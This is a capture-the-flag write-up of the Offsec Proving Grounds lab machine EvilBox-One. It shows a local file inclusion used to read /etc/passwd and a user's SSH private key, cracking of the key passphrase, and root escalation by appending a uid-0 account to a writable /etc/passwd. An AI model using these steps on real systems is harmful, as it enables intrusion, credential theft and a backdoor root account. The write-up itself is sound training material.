---
title: "Proving grounds Play: EvilBox-One"
layout: post
date: 2023-09-02 03:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## PORT 80 || Web

![img](/assets/images/CTF/Proving_Grounds/EvilBox-One/web.png)

## Fuzzing

### Files

![img](/assets/images/CTF/Proving_Grounds/EvilBox-One/robots.png)

### Directory

![img](/assets/images/CTF/Proving_Grounds/EvilBox-One/dir1.png)

Fuzz for files in `/secrets` directory.

![img](/assets/images/CTF/Proving_Grounds/EvilBox-One/dir2.png)

**Found file evil.php**

http://192.168.152.212/secret/evil.php

## Fuzz for paramaters

http://192.168.152.212/secret/evil.php?FUZZ=/etc/passwd

Trying local file inclusion vulnerability to check the words retieved in the response to confirm the parameter.

![img](/assets/images/CTF/Proving_Grounds/EvilBox-One/param.png)

http://192.168.152.212/secret/evil.php?command=/etc/passwd

![img](/assets/images/CTF/Proving_Grounds/EvilBox-One/lfi.png)

As shown in the above `/etc/passwd` file we have a user `mowree`.

```sh
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
```

Using the LFI vulnerability we can obtain the SSH key for the user `mowree`.

http://192.168.152.212/secret/evil.php?command=/home/mowree/.ssh/id_rsa

![img](/assets/images/CTF/Proving_Grounds/EvilBox-One/mowree-ssh.png)

SSH to mowree using the SSH key.

Using id_rsa key to login to the `mowree` user account is prompted with password to continue. So use `ssh2john` to create hash for the SSH key and crack the same using john.

![img](/assets/images/CTF/Proving_Grounds/EvilBox-One/crack-password.png)

Extracted password `unicorn`

**Initial Foothold Obtained**

![img](/assets/images/CTF/Proving_Grounds/EvilBox-One/user.png)

## Privilege Escalation

Check the permissions for `/etc/passwd`.

/etc/passwd is writable so we can create our own root user.

**Writing new user to /etc/passwd**

```sh
echo "hacker:bWBoOyE1sFaiQ:0:0:root:/root:/bin/bash" >> /etc/passwd
```

Switch to user `hacker` and enter password `mypass` to obtain root.

![img](/assets/images/CTF/Proving_Grounds/EvilBox-One/root.png)

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).